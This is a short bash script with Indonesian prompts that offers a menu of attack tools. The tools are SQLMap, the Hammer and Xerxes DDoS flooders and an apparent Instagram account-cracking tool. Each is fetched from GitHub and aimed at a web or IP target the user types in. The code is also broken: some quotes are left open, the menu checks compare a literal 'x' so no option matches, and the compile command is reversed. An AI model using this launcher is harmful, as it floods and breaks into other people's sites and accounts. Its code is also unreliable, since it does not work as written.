echo "Selamat Datang di penyedia 4 tools sederhana kami :)
sleep 0.2
echo "Dengan nama siapa kalau boleh tahu? (Opsional)"
read nama
sleep 0.5
echo "==== NAMA : $nama ======"
sleep 0.7
echo "========LIST TOOLS=========="
sleep 1
echo "01) SQL MAP"
sleep 0.1
echo "02) DDOS HAMMER"
sleep 0.1
echo "03) DDOS XERXES"
sleep 0.1
echo "04) Dark Instagram"
sleep 2
read -p "<[mryouknowme@tools]> " x;

if [ x = 01 ] || [ x = 01 ]
then 
clear
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
echo "Masukan Web Target ( HARUS VULN ) : "
read target
python2 sqlmap.py --url $target --dbs
fi

if [ x = 02 ] || [ x = 02 ]
then
clear
git clone https://github.com/cyweb/hammer
cd hammer
echo "Masukan IP Target : "
read ip
echo "Masukan Port : 
read port
echo "Masukan Turbo : "
read turbo
python hammer.py -s $ip -p $port -t $turbo
fi

if [ x = 03 ] || [ x = 03 ]
then
clear
git clone https://github.com/zanyarjamal/xerxes
cd xerxes
gcc xerxes -o xerxes.c
echo "Masukan Web target : "
read web
./xerxes $web 80
fi

if [ x = 04 ] || [ x = 04 ]
then
clear
git clone https://github.com/rezadkim/dark-ig
cd dark-ig
python2 ig.py
fi

if [ x = 00 ] || [ x = 00 ]
then
clear
echo "Thanks to Author "Mr.Y0uKn0wM3"
sleep 0.2
echo "Thanks to GreyHat Team"
sleep 0.3
echo "Maaf jika masih jelek :( Masih pemula :/
sleep 0.4
echo "== Terimakasih telah menggunakan tools simple ini !!===="
exit
fi
